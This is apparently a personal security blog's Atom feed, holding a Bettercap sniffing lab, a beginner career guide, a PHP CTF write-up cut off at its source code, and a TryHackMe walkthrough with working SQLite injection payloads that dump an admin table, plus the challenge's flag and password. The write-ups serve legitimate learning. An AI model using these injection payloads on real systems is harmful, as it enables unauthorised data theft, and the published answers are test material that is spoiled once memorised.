<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>npx</title>
  
  <subtitle>npx</subtitle>
  <link href="https://blog.aawart.com.np/atom.xml" rel="self"/>
  
  <link href="https://blog.aawart.com.np/"/>
  <updated>2025-09-22T06:03:50.054Z</updated>
  <id>https://blog.aawart.com.np/</id>
  
  <author>
    <name>Aawart K C</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HTTP vs HTTPS: What Network Sniffers Can Really See</title>
    <link href="https://blog.aawart.com.np/Network_sniffing/"/>
    <id>https://blog.aawart.com.np/Network_sniffing/</id>
    <published>2025-09-21T15:15:00.000Z</published>
    <updated>2025-09-22T06:03:50.054Z</updated>
    
    <content type="html"><![CDATA[<p>Have you ever wondered what someone on the same network could actually see when you’re browsing the web? You’ve probably heard that “HTTP is unsafe” and that “HTTPS keeps you secure,” but it still exposes some metadata. Have you ever really seen this in action?</p><p>In this blog, I’ll show you exactly what an on-network observer can capture. Using a small, ethical lab with Bettercap, I explored what’s visible when visiting websites from my own devices (a Kali VM as the attacker and my Windows PC as the victim) on a completely isolated network. You might be surprised at what can be seen, even without breaking any laws.</p><hr><h2 id="Understanding-packet-sniffing"><a href="#Understanding-packet-sniffing" class="headerlink" title="Understanding packet sniffing"></a>Understanding packet sniffing</h2><p>Packet sniffing is the practice of observing network traffic to learn about devices and their communication. When traffic is unencrypted, it is possible to see the exact data exchanged. When traffic is encrypted, you can still see some metadata such as which websites or services are being contacted. Packet sniffing is a key concept in understanding network security and privacy.</p><hr><h2 id="Tools-used-Bettercap-focused"><a href="#Tools-used-Bettercap-focused" class="headerlink" title="Tools used (Bettercap-focused)"></a>Tools used (Bettercap-focused)</h2><ul><li><p><strong>Bettercap</strong>: used to discover hosts and observe network level metadata from an attacker perspective.  </p></li><li><p><strong>My Windows PC</strong>: used as the test victim.</p></li></ul><blockquote><p>Note: this post intentionally <em>does not</em> publish commands or scripts to intercept traffic on networks you do not own. If you want detailed lab notes for private study, contact me for sanitized access.</p></blockquote><hr><h2 id="Project-workflow"><a href="#Project-workflow" class="headerlink" title="Project workflow"></a>Project workflow</h2><blockquote><p>I ran Bettercap on the attacker machine and open the help menu, you will see multiple modules. For this demo I focused on three high-level modules:</p></blockquote><ul><li><p><strong>net.probe</strong>: host discovery on the subnet (lists IPs and vendor info of devices on the local network).  </p></li><li><p><strong>arp.spoof</strong>: a module that can enable a Man-in-the-Middle scenario in a controlled lab to show how traffic might be hijacked. </p></li><li><p><strong>net.sniff</strong>: captures packets and extracts application layer metadata.</p></li></ul><hr><h2 id="Observations"><a href="#Observations" class="headerlink" title="Observations"></a>Observations</h2><p>During the lab, I tested both <strong>HTTP</strong> and <strong>HTTPS</strong> websites to see what Bettercap can capture.</p><ul><li><p><strong>HTTP Example:</strong><br>I visited <a class="link"   href="http://testasp.vulnweb.com/" >http://testasp.vulnweb.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> and went to the login page using:  </p><ul><li><strong>Username:</strong> test  </li><li><strong>Password:</strong> test</li></ul><p>Bettercap captured exactly what I typed in the login form, including the username and password.<br>This clearly demonstrates that <strong>HTTP traffic is not encrypted</strong> and everything is visible to an on network observer.</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/bettercap_http.png"                      alt="Bettercap HTTP login capture"                ><br><em>Image: Bettercap captured username and password on HTTP site.</em></p></li><li><p><strong>HTTPS Example:</strong><br>I visited <a class="link"   href="https://aawart.com.np/" >https://aawart.com.np<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.<br>Bettercap could not see the login credentials or page content, but it still detected metadata:  </p><ul><li><strong>TLS SNI:</strong> shows the domain <code>aawart.com.np</code>  </li><li><strong>mDNS traffic:</strong> background protocol traffic that may appear in the capture</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/bettercap_https.png"                      alt="Bettercap HTTPS metadata capture"                ><br><em>Image: Bettercap shows domain accessed via TLS SNI.</em></p></li></ul><hr><h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h2><ol><li><strong>HTTP is dangerous</strong>: Everything is sent in plaintext. Usernames, passwords and page content can be captured by anyone on the same network.  </li><li><strong>HTTPS is safer but not perfect</strong>: While login credentials and content are encrypted, metadata like the domain name (via TLS SNI) is still visible.  </li><li><strong>Public Wi-Fi is risky</strong>: Any untrusted network can allow attackers to sniff traffic and steal sensitive information if sites are HTTP.  </li><li><strong>Filtering helps</strong>: When analyzing captures, filtering out background protocols (mDNS, SSDP, etc.) improves clarity and focuses on meaningful activity.  </li><li><strong>Ethics matter</strong>: Experiments should only be run on networks and devices you own or have explicit permission to use. Unauthorized interception is illegal.</li></ol><hr><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This lab demonstrates how network traffic can be observed safely for educational purposes. Key lessons:  </p><ul><li><strong>Never use HTTP for sensitive activity</strong> on public or untrusted networks.  </li><li><strong>Always prefer HTTPS</strong> to protect credentials and data, but remember that some metadata like visited domains is still visible.  </li><li>Understanding network security helps protect against attackers, especially on shared networks like coffee shop Wi-Fi or airports.</li></ul><p>For anyone interested in a deeper look at this lab, I can share <strong>sanitized lab notes</strong> or a private demo under controlled access.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Have you ever wondered what someone on the same network could actually see when you’re browsing the web? You’ve probably heard that “HTTP</summary>
      
    
    
    
    <category term="Network security" scheme="https://blog.aawart.com.np/categories/Network-security/"/>
    
    
    <category term="Bettercap" scheme="https://blog.aawart.com.np/tags/Bettercap/"/>
    
  </entry>
  
  <entry>
    <title>TryHackMe Light Full Walkthrough &amp; SQL Injection Exploit</title>
    <link href="https://blog.aawart.com.np/TryHackMe-light-challenge/"/>
    <id>https://blog.aawart.com.np/TryHackMe-light-challenge/</id>
    <published>2025-06-26T16:20:59.000Z</published>
    <updated>2025-07-11T15:18:24.515Z</updated>
    
    <content type="html"><![CDATA[<p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/lightthm.png"                      alt="Light"                ><br>A beginner-friendly challenge focused on SQL Injection in SQLite.</p><hr><h2 id="Challenge-Setup"><a href="#Challenge-Setup" class="headerlink" title="Challenge Setup"></a>Challenge Setup</h2><p>While connecting to the machine on port <code>1337</code> using <code>nc</code>, we’re welcomed with a login prompt:</p><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.10.39.206 1337</span><br></pre></td></tr></table></figure></div><p>Output:</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the Light database!</span><br><span class="line">Please enter your username:</span><br></pre></td></tr></table></figure></div><hr><h2 id="Testing-for-SQL-Injection"><a href="#Testing-for-SQL-Injection" class="headerlink" title="Testing for SQL Injection"></a>Testing for SQL Injection</h2><p>I started with classic test inputs:</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Please enter your username: smokey</span><br><span class="line">Password: vYQ5ngPpw8AdUmL</span><br></pre></td></tr></table></figure></div><p>Then:</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Please enter your username: admin</span><br><span class="line">Username not found.</span><br></pre></td></tr></table></figure></div><p>Trying a single quote:</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Please enter your username: &#x27;</span><br><span class="line">Error: unrecognized token: &quot;&#x27;&#x27;&#x27; LIMIT 30&quot;</span><br></pre></td></tr></table></figure></div><p>This error confirms that SQL queries are constructed, unsafely allowing SQL Injection.</p><hr><h2 id="Understanding-the-Query-Structure"><a href="#Understanding-the-Query-Structure" class="headerlink" title="Understanding the Query Structure"></a>Understanding the Query Structure</h2><p>Using inputs like:</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Please enter your username: smokey&#x27; &#x27;</span><br><span class="line">Error: near &quot;&#x27;&#x27;&quot;: syntax error</span><br></pre></td></tr></table></figure></div><p>Suggested the query could look like:</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT password FROM users WHERE username = &#x27;.....&#x27; LIMIT 30;</span><br></pre></td></tr></table></figure></div><p>Tried some filtering tests:</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please enter your username: smokey&#x27; --</span><br></pre></td></tr></table></figure></div><p>Response:</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">For strange reasons I can&#x27;t explain, any input containing /*, -- or, %0b is not allowed :)</span><br></pre></td></tr></table></figure></div><p>So characters like –, &#x2F;*, and %0b are filtered. Time to get creative!</p><hr><h2 id="Bypassing-Filters-Identifying-the-Database-Type"><a href="#Bypassing-Filters-Identifying-the-Database-Type" class="headerlink" title="Bypassing Filters &amp; Identifying the Database Type"></a>Bypassing Filters &amp; Identifying the Database Type</h2><p>I first assumed MySQL and tried:</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; UNION SELECT @@version</span><br></pre></td></tr></table></figure></div><p>But got:</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: unrecognized token: &quot;@&quot;</span><br></pre></td></tr></table></figure></div><p>Tried PostgreSQL and other DBMS payloads but no success. Then I try:</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Please enter your username: &#x27; Union Select sqlite_version()&#x27;</span><br><span class="line">Password: 3.31.1</span><br></pre></td></tr></table></figure></div><p>Boom! Two key takeaways:</p><ul><li>Backend is SQLite</li><li>SQLi works even without comments</li></ul><hr><h2 id="Extracting-Tables-Data"><a href="#Extracting-Tables-Data" class="headerlink" title="Extracting Tables &amp; Data"></a>Extracting Tables &amp; Data</h2><p>To enumerate tables:</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Please enter your username: &#x27; Union Select name FROM sqlite_master&#x27;</span><br><span class="line">Password: admintable</span><br></pre></td></tr></table></figure></div><p>Found a table: <code>admintable.</code></p><p>To dump credentials:</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Please enter your username: &#x27; Union Select username || &#x27;~&#x27; || password from admintable&#x27;</span><br><span class="line">Password: TryHackMeAdmin~mamZtAuMlrsEy5bp6q17</span><br></pre></td></tr></table></figure></div><p>To retrieve the flag:</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Please enter your username: &#x27; Union Select password from admintable&#x27;</span><br><span class="line">Password: THM&#123;SQLit3_InJ3cTion_is_SimplE_nO?&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="Why-Two-Different-“Password”-Outputs"><a href="#Why-Two-Different-“Password”-Outputs" class="headerlink" title="Why Two Different “Password” Outputs?"></a>Why Two Different “Password” Outputs?</h2><p>In this payload:</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; Union Select username || &#x27;~&#x27; || password from admintable&#x27;</span><br></pre></td></tr></table></figure></div><p>The || operator concatenates username and password with ~</p><p>Result: <code>TryHackMeAdmin~mamZtAuMlrsEy5bp6q17</code></p><p>But here:</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; Union Select password from admintable&#x27;</span><br></pre></td></tr></table></figure></div><p>You’re fetching just the password column which contains the actual flag.</p><hr><h3 id="Challenge-Answers"><a href="#Challenge-Answers" class="headerlink" title="Challenge Answers"></a>Challenge Answers</h3><ol><li>Admin username: <code>TryHackMeAdmin</code></li><li>Password: <code>mamZtAuMlrsEy5bp6q17</code></li><li>Flag: <code>THM&#123;SQLit3_InJ3cTion_is_SimplE_nO?&#125;</code></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img  
                     lazyload
                     src=&quot;/images/loading.svg&quot;
                     data-src=&quot;/images/lightthm.png&quot;
</summary>
      
    
    
    
    <category term="SQLi" scheme="https://blog.aawart.com.np/categories/SQLi/"/>
    
    
    <category term="SQLi" scheme="https://blog.aawart.com.np/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>How to Start in Cybersecurity – For Absolute Beginners</title>
    <link href="https://blog.aawart.com.np/How-to-Start-in-Cybersecurity/"/>
    <id>https://blog.aawart.com.np/How-to-Start-in-Cybersecurity/</id>
    <published>2025-06-22T15:15:00.000Z</published>
    <updated>2025-07-21T15:01:39.142Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Start-Your-Cybersecurity-Journey"><a href="#Start-Your-Cybersecurity-Journey" class="headerlink" title="Start Your Cybersecurity Journey"></a>Start Your Cybersecurity Journey</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/knowaboutcyber.png"                      alt="Know About Cyber"                ></p><p>My name is <strong>Aawart KC</strong> and I’m from <strong>Nepal</strong> 🇳🇵. I’m writing this blog to help <strong>anyone who wants to start learning cybersecurity</strong>. </p><p>If you’re confused and don’t know where to begin, you’re not alone. I was in the same spot too. But the good news is <strong>you don’t need to be a genius to start</strong>. You just need to be <strong>curious and consistent</strong>.</p><p>Cybersecurity is not just about “hacking” it’s a <strong>huge field</strong>. This blog will help you understand where to start, what to learn, and how to keep going.</p><hr><h2 id="What-part-of-cybersecurity-actually-excites-you"><a href="#What-part-of-cybersecurity-actually-excites-you" class="headerlink" title="What part of cybersecurity actually excites you?"></a>What part of cybersecurity actually excites you?</h2><p>That’s the <strong>first question</strong> you need to ask yourself. There are different areas in cybersecurity. If you know what excites you, learning becomes much easier and more fun.</p><hr><h2 id="Step-1-Understand-the-3-Main-Cybersecurity-Paths"><a href="#Step-1-Understand-the-3-Main-Cybersecurity-Paths" class="headerlink" title="Step 1: Understand the 3 Main Cybersecurity Paths"></a>Step 1: Understand the 3 Main Cybersecurity Paths</h2><h3 id="🔴-Red-Team-–-Break-In-Offensive-Security"><a href="#🔴-Red-Team-–-Break-In-Offensive-Security" class="headerlink" title="🔴 Red Team – Break In (Offensive Security)"></a>🔴 Red Team – Break In (Offensive Security)</h3><p>Red Teamers are <strong>ethical hackers</strong>. They try to break into systems and websites just like real attackers but legally, to help organizations become safer.</p><p><strong>Skills</strong>:  </p><ul><li>Exploiting bugs, reverse engineering, scripting and many more.</li></ul><p><strong>Tools</strong>:  </p><ul><li>Nmap (network scanning)  </li><li>Burp Suite (website testing)  </li><li>Gobuster (hidden files)  </li><li>SQLmap (SQL injection)  </li><li>ZAP Proxy (web attacks)</li></ul><p><strong>For you if</strong> you like breaking stuff, solving puzzles, or CTFs.</p><blockquote><p><strong>Don’t worry about the tools.</strong> You’ll slowly learn what each one does and when to use them. Just start exploring!</p></blockquote><p><strong>Note:</strong><br>In Red Team, there are many different roles, but all of them focus on attacking or finding weaknesses in systems to help improve security.</p><hr><h3 id="🔵-Blue-Team-–-Defend-Defensive-Security"><a href="#🔵-Blue-Team-–-Defend-Defensive-Security" class="headerlink" title="🔵 Blue Team – Defend (Defensive Security)"></a>🔵 Blue Team – Defend (Defensive Security)</h3><p>Blue Teamers <strong>defend systems</strong>. They watch over servers, detect hackers, and respond quickly to attacks. They are the protectors who keep organizations safe.</p><p><strong>Skills</strong>:  </p><ul><li>Log analysis, SIEM, incident response, monitoring networks.</li></ul><p><strong>Tools</strong>:  </p><ul><li>Wireshark (traffic analysis)  </li><li>Splunk (log monitoring)   </li><li>ZAP Proxy (testing security, from defender’s view)</li></ul><p>If you enjoy protecting systems and working as part of a team, this path could be perfect for you.</p><blockquote><p><strong>Don’t worry about the tools right now.</strong> You’ll learn what they do and how to use them step by step as you go.</p></blockquote><p><strong>Note:</strong><br>In Blue Team, there are many roles but all of them focus on defending like monitoring, detecting, and responding to threats to keep systems safe.</p><hr><h3 id="🟢-GRC-–-Policy-Compliance"><a href="#🟢-GRC-–-Policy-Compliance" class="headerlink" title="🟢 GRC – Policy &amp; Compliance"></a>🟢 GRC – Policy &amp; Compliance</h3><p>GRC stands for <strong>Governance, Risk, and Compliance</strong>. These people don’t hack or code much, but they are very important. They make <strong>rules and security policies</strong> and ensure the company is <strong>safe, legal and running smoothly</strong>.</p><p><strong>Skills</strong>:  </p><ul><li>Writing policies, risk assessment, planning.</li></ul><p><strong>Tools</strong>:  </p><ul><li>Excel (yes, a lot!)  </li><li>ISO 27001, NIST CSF tools  </li><li>Dashboards for managing audits  </li><li>ZAP Proxy (for checking compliance in apps)</li></ul><p><strong>For you if</strong> you enjoy organizing, planning, and writing, this path might suit you well.</p><blockquote><p><strong>Don’t worry if this sounds new.</strong> You’ll learn how these tools and processes work step by step if you start researching, watch video and more.</p></blockquote><h4 id="Are-There-Only-3-Paths"><a href="#Are-There-Only-3-Paths" class="headerlink" title="Are There Only 3 Paths?"></a>Are There Only 3 Paths?</h4><p>Not really, these 3 are a great way to start, but there are more roles too, like:</p><ul><li>Purple Team – Bridge between Red &amp; Blue</li><li>Threat Intelligence – Tracking hacker groups</li><li>Digital Forensics (DFIR) – Investigating attacks</li><li>Security Awareness – Teaching users about safety</li><li>Security Engineering – Building secure systems</li></ul><blockquote><p>But don’t worry about these now just focus on Red, Blue, or GRC first. You’ll discover more as you learn.</p></blockquote><hr><h2 id="Step-2-Start-the-Journey-What-To-Do"><a href="#Step-2-Start-the-Journey-What-To-Do" class="headerlink" title="Step 2: Start the Journey (What To Do)"></a>Step 2: Start the Journey (What To Do)</h2><p>Here’s a beginner-friendly roadmap:</p><hr><h3 id="1-Pick-a-Path-Red-Blue-or-GRC"><a href="#1-Pick-a-Path-Red-Blue-or-GRC" class="headerlink" title="1. Pick a Path: Red, Blue, or GRC"></a>1. Pick a Path: Red, Blue, or GRC</h3><p>To find out which cybersecurity path is best for you, do some research first.  </p><p>Watch YouTube videos and read articles about each path to understand what they do.  </p><p>Try searching for:  </p><ul><li>“Red Team vs Blue Team vs GRC”  </li><li>“Cybersecurity roles explained”</li></ul><p>This will help you know which path fits your interests and skills the most.</p><blockquote><p><strong>Remember:</strong><br>Research and explore each option so you can choose the best path for you.</p></blockquote><hr><h3 id="2-Learn-Linux"><a href="#2-Learn-Linux" class="headerlink" title="2. Learn Linux"></a>2. Learn Linux</h3><p>Linux is used <strong>everywhere in cybersecurity</strong>. Learn simple commands first.</p><p>Here’s a free course:<br>🔗 <a class="link"   href="https://tryhackme.com/room/linuxfundamentalspart1" >TryHackMe - Linux Fundamentals Part 1<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p><p>You can try these commands for practice:</p><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span>       <span class="comment"># Show current location</span></span><br><span class="line"><span class="built_in">ls</span>        <span class="comment"># List files</span></span><br><span class="line"><span class="built_in">cd</span>        <span class="comment"># Change directory</span></span><br><span class="line"><span class="built_in">mkdir</span>     <span class="comment"># Make folder</span></span><br><span class="line"><span class="built_in">rm</span>        <span class="comment"># Delete file/folder</span></span><br><span class="line"><span class="built_in">cat</span>         <span class="comment"># Show file content</span></span><br><span class="line">nano        <span class="comment"># Simple text editor</span></span><br><span class="line"><span class="built_in">chmod</span>       <span class="comment"># Change permissions</span></span><br><span class="line">ping        <span class="comment"># Test network connection</span></span><br></pre></td></tr></table></figure></div><h4 id="YouTube-Recommendations"><a href="#YouTube-Recommendations" class="headerlink" title="YouTube Recommendations:"></a>YouTube Recommendations:</h4><ol><li>Linux for Hackers - NetworkChuck</li><li>Linux Basics - The Cyber Mentor</li></ol><blockquote><p><strong>Tip:</strong><br>You don’t need to focus too hard — you’ll learn Linux naturally over time.<br>Just like how we slowly learned to use Windows by using it every day, you’ll get used to Linux the same way. Try a few commands daily and explore bit by bit!</p></blockquote><hr><h3 id="3-Learn-Basics-Networking-Scripting"><a href="#3-Learn-Basics-Networking-Scripting" class="headerlink" title="3. Learn Basics: Networking &amp; Scripting"></a>3. Learn Basics: Networking &amp; Scripting</h3><p>Before diving deep, understand the fundamentals. These will help you later with everything — whether it’s hacking or defending.</p><p>Start by learning these questions:</p><ul><li>What is an IP address?  </li><li>What is DNS?  </li><li>What is HTTP, HTTPS, SSH?  </li><li>What is a port? Types of ports?  </li><li>URL structure and status codes (e.g., 200, 404)  </li><li>HTTP methods (GET, POST, etc.)  </li><li>How websites actually work  </li><li>What is a firewall?  </li><li>Learn the Cyber Kill Chain (attacker steps)</li></ul><p>Also, try to write <strong>simple scripts</strong> in:</p><ul><li>Python  </li><li>Bash</li></ul><hr><h3 id="4-Get-Hands-On-Experience"><a href="#4-Get-Hands-On-Experience" class="headerlink" title="4. Get Hands-On Experience"></a>4. Get Hands-On Experience</h3><p>Once you have a basic understanding, it’s time to practice. There are many platforms, but I personally recommend starting with:</p><ul><li>🔗 <a class="link"   href="https://tryhackme.com/" >TryHackMe<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>  </li><li>🔗 <a class="link"   href="https://www.hackthebox.com/" >Hack The Box<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li></ul><p>These platforms let you practice cybersecurity skills in real virtual labs.</p><hr><h3 id="5-Start-Using-Tools"><a href="#5-Start-Using-Tools" class="headerlink" title="5. Start Using Tools"></a>5. Start Using Tools</h3><p>Start slowly with tools made for beginners. Learn <strong>what</strong> the tools do and <strong>why</strong> we use them.</p><h4 id="🔴-Red-Team-Attacking"><a href="#🔴-Red-Team-Attacking" class="headerlink" title="🔴 Red Team (Attacking):"></a>🔴 Red Team (Attacking):</h4><ul><li><strong>Nmap</strong> – Network scanner  </li><li><strong>Burp Suite</strong> – Web testing  </li><li><strong>SQLMap</strong> – Database injection testing  </li><li><strong>ZAP Proxy</strong> – Web attack analyzer  </li><li><strong>Gobuster</strong> – Find hidden pages&#x2F;files</li></ul><h4 id="🔵-Blue-Team-Defending"><a href="#🔵-Blue-Team-Defending" class="headerlink" title="🔵 Blue Team (Defending):"></a>🔵 Blue Team (Defending):</h4><ul><li><strong>Wireshark</strong> – Analyze network traffic  </li><li><strong>Splunk</strong> – Log management and monitoring  </li><li><strong>ELK Stack</strong> – Logging and alerting  </li><li><strong>OSQuery</strong> – System monitoring  </li><li><strong>ZAP Proxy</strong> – Used for learning how attacks work (from a defender’s view)</li></ul><h4 id="🟢-GRC-Policy-Compliance"><a href="#🟢-GRC-Policy-Compliance" class="headerlink" title="🟢 GRC (Policy &amp; Compliance):"></a>🟢 GRC (Policy &amp; Compliance):</h4><ul><li>Learn to write security policies  </li><li>Study <strong>ISO 27001</strong> and <strong>NIST</strong> frameworks  </li><li>Practice Risk Management  </li><li>Use <strong>Excel</strong> and compliance dashboards  </li><li>Try <strong>ZAP</strong> to check apps against policy requirements</li></ul><hr><h3 id="6-Join-the-Cybersecurity-Community"><a href="#6-Join-the-Cybersecurity-Community" class="headerlink" title="6. Join the Cybersecurity Community"></a>6. Join the Cybersecurity Community</h3><p>This is <strong>very important</strong> and many beginners skip it.</p><p>Join forums, Discord servers, Reddit subs, or Telegram groups.<br>Ask questions, share your progress, and stay updated.</p><p>You’ll learn faster and feel less alone.</p><hr><h3 id="7-Build-Projects-Share-Your-Work"><a href="#7-Build-Projects-Share-Your-Work" class="headerlink" title="7. Build Projects &#x2F; Share Your Work"></a>7. Build Projects &#x2F; Share Your Work</h3><p>This step makes you stand out. Start a GitHub or a blog. Share:</p><ul><li>CTF writeups</li><li>Tools you tried</li><li>Notes from what you learned</li><li>Scripts you wrote</li></ul><p>Example: blog.aawart.com.np<br>This is how I’m doing it!</p><blockquote><p>Even if you’re a beginner — share what you learn. It shows your growth.</p></blockquote><hr><h3 id="Final-Words"><a href="#Final-Words" class="headerlink" title="Final Words"></a>Final Words</h3><p>If you’re feeling lost, that’s totally okay. Everyone starts that way.</p><blockquote><p><strong>Give yourself just 3 months.</strong><br>Try something new each week.<br>Watch a video, write a script, solve a challenge, or talk to someone in the field.</p></blockquote><p>And most importantly…</p><h3 id="Don’t-quit-You-WILL-get-better"><a href="#Don’t-quit-You-WILL-get-better" class="headerlink" title="Don’t quit. You WILL get better."></a>Don’t quit. You WILL get better.</h3><p>Everything becomes easier once you <strong>start doing</strong>.</p><blockquote><p>I promise — if you stay curious, this journey will be one of the most exciting things you’ll ever do.</p></blockquote><hr><h3 id="Need-Help-I’m-Here"><a href="#Need-Help-I’m-Here" class="headerlink" title="Need Help? I’m Here!"></a>Need Help? I’m Here!</h3><p>You can always reach out to me. I’ll try my best to help:</p><ul><li><strong><a class="link"   href="https://www.linkedin.com/in/aawart-k-c-8b1326314/" >LinkedIn<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong>  </li><li><strong>Email:</strong> <a class="link"   href="mailto:&#x61;&#x61;&#119;&#97;&#x72;&#116;&#x32;&#48;&#48;&#x35;&#64;&#103;&#x6d;&#97;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;" >aawart2005@gmail.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>  </li><li><strong>Instagram:</strong> <a class="link"   href="https://www.instagram.com/chettriiiiiii" >@aawart.kc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li></ul><p>I’ll answer every question, no matter how small.</p><p>I’m also a beginner and still learning.<br>I wrote this guide because I was once confused too, and I don’t want you to feel the same way.</p><p><strong>Let’s learn and grow together. Just message me anytime.</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Start-Your-Cybersecurity-Journey&quot;&gt;&lt;a href=&quot;#Start-Your-Cybersecurity-Journey&quot; class=&quot;headerlink&quot; title=&quot;Start Your Cybersecurity Jou</summary>
      
    
    
    
    <category term="Cybersecurity" scheme="https://blog.aawart.com.np/categories/Cybersecurity/"/>
    
    
    <category term="Cybersecurity" scheme="https://blog.aawart.com.np/tags/Cybersecurity/"/>
    
    <category term="Guide" scheme="https://blog.aawart.com.np/tags/Guide/"/>
    
  </entry>
  
  <entry>
    <title>Free-Flagging – GPNCTF 2025 Writeup</title>
    <link href="https://blog.aawart.com.np/GPNCTF-Free-Flagging/"/>
    <id>https://blog.aawart.com.np/GPNCTF-Free-Flagging/</id>
    <published>2025-06-22T04:15:00.000Z</published>
    <updated>2025-07-21T14:54:41.189Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Free-Flagging"><a href="#Free-Flagging" class="headerlink" title="Free Flagging"></a>Free Flagging</h2><blockquote><p>A small PHP challenge with a sneaky bug that can be defeated with just <strong>one line</strong> of magic. In this blog post, I’m sharing how I solved the Free-Flagging CTF challenge from GPNCTF 2025.</p></blockquote><hr><h2 id="Challenge-Summary"><a href="#Challenge-Summary" class="headerlink" title="Challenge Summary"></a>Challenge Summary</h2><p>This was a web challenge from <strong>GPNCTF 2025</strong> called <code>Free-Flagging</code>.</p><p>We were given: </p><p>Spawn challenge instance<br>ncat –ssl free-flagging.gpn23.ctf.kitctf.de 443</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/access-gpn.png"                      alt="ncat"                ></p><p>As you can see it provides url that led to a PHP web application:-<br><code>https://stormwood-of-unstoppable-commerce.gpn23.ctf.kitctf.de</code></p><p>When I visited the URL, if I didn’t send a POST request, the server would just show me its source code. It’s like opening the program and seeing exactly how it works.</p><hr><h2 id="The-Source-Code"><a href="#The-Source-Code" class="headerlink" title="The Source Code"></a>The Source Code</h2><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 